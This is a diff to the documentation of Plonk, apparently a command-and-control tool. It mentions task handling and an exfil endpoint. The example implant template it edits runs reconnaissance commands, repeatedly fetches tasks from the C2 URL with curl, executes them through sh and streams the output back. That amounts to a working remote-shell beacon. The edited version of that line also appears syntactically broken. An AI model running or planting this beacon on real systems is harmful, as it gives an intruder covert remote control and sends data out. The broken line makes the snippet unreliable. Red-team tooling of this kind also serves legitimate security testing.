@@ -33,6 +33,8 @@ request for `/t/<ID>`.  Tasks are queued in the client by selecting an implant
 with `,seti` and then giving the task as a command, or, alternatively, with
 `,task`.
 
+Tasking sent to the implant will have a newline appended.
+
 ### Example
 #### Client:
 ```
@@ -187,14 +189,14 @@ If there is no `implant.tmpl`, the built-in
 
 #### Example
 This template runs a few commands for situational awareness then beacons back
-to Plonk every two seconds for an hour with a single, persistent output
+to Plonk every two seconds for an hour.  It uses a single, persistent output
 connection.
 ```sh
 export PLONK_ID="{{ .RandN }}-$(hostname)-$$"
 (
         echo 'ps awwwfux || ps auxwww; uname -a; id; pwd'
-        curl -sw '\n' --rate 30/m "{{ .URL }}/t/$PLONK_ID?n=[0-1800]"
-) | sh 2>&1 | curl -vsT. "{{ .URL }}/o/$PLONK_ID"
+        curl -s --rate 30/m "{{ .URL }}/t/$PLONK_ID?n=[0-1800]"
+) /bin/sh 2>&1 | curl -sT. "{{ .URL }}/o/$PLONK_ID"
 ```
 
 Exfil (`/p`)
